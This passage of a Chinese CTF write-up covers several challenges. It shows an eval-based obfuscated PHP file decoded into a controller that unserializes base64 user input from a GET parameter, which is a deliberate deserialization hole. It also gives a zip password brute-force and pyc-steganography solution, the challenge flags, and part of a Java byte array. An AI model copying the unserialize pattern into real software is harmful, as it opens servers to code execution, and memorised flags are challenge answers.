class="number">13</span>];<span class="variable">$arCiCL</span>.=<span class="variable">$DusPFr</span>[<span class="number">22</span>].<span class="variable">$DusPFr</span>[<span class="number">36</span>].<span class="variable">$DusPFr</span>[<span class="number">29</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>].<span class="variable">$DusPFr</span>[<span class="number">32</span>].<span class="variable">$DusPFr</span>[<span class="number">35</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="keyword">eval</span>(<span class="variable">$arCiCL</span>(<span class="string">&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试手动逐层解密，最后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">            unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C4zyC0m3On</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h3><p>zip压缩包根据提示爆破6位数字密码为 <code>220101</code>，解压有 <code>steg.pyc</code> 和 <code>flag.txt</code>。</p><p>用uncompyle6逆pyc发现无有意义代码，为pyc隐写，用stegosaurus工具解密：</p><p><code>python stegosaurus.py steg.pyc -x</code></p><p>得到密码 <code>Extracted payload: TheKey:St3g1sV3ryFuNny</code>。</p><p>再将 <code>flag.txt</code> 中emoji密文用emoji-aes解得到flag：<code>cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</code></p><p>​    </p><h3 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h3><blockquote><p>二进制</p></blockquote><p>文件头 <code>CAFEBABE</code> 说明为 <code>.class</code> Java字节码文件，用jadx查看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Main  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] strArr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr = &#123;<span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, 